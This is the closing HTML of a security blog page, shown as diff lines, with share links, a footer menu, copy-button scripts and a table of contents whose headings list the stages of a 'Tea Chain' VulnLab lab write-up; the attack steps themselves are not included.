+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tea-Chain-VulnLab-Chain-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Tea Chain - VulnLab Chain Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target-Information"><span class="toc-number">1.1.</span> <span class="toc-text">Target Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Domain-Controller-DC-tea-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - Domain Controller (DC.tea.vl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Server-SRV-tea-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - Server (SRV.tea.vl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Web-Enumeration"><span class="toc-number">1.2.3.</span> <span class="toc-text">Initial Web Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-CI-CD-Runner-Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via CI&#x2F;CD Runner Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-Steps"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploitation Steps</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Establishing-Command-and-Control"><span class="toc-number">1.4.</span> <span class="toc-text">Establishing Command and Control</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Post-Exploitation Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.5.1.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.5.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAPS-Discovery"><span class="toc-number">1.5.3.</span> <span class="toc-text">LAPS Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-LAPS-Password"><span class="toc-number">1.5.4.</span> <span class="toc-text">Extracting LAPS Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Local-Administrator-Access"><span class="toc-number">1.5.5.</span> <span class="toc-text">Gaining Local Administrator Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WSUS-Exploitation-for-Domain-Admin"><span class="toc-number">1.6.</span> <span class="toc-text">WSUS Exploitation for Domain Admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Confirming-WSUS-Installation"><span class="toc-number">1.6.1.</span> <span class="toc-text">Confirming WSUS Installation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-WSUS"><span class="toc-number">1.6.2.</span> <span class="toc-text">Exploiting WSUS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Compromise"><span class="toc-number">1.6.3.</span> <span class="toc-text">Domain Compromise</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Admin-achieved-%F0%9F%8E%89"><span class="toc-number">1.7.</span> <span class="toc-text">Domain Admin achieved! 🎉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.8.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/06/VL-Tea/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&text=VL-Tea"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&is_video=false&description=VL-Tea"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Tea&body=Check out this article: https://panosoikogr.github.io/2025/11/06/VL-Tea/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&name=VL-Tea&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/06/VL-Tea/&t=VL-Tea"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
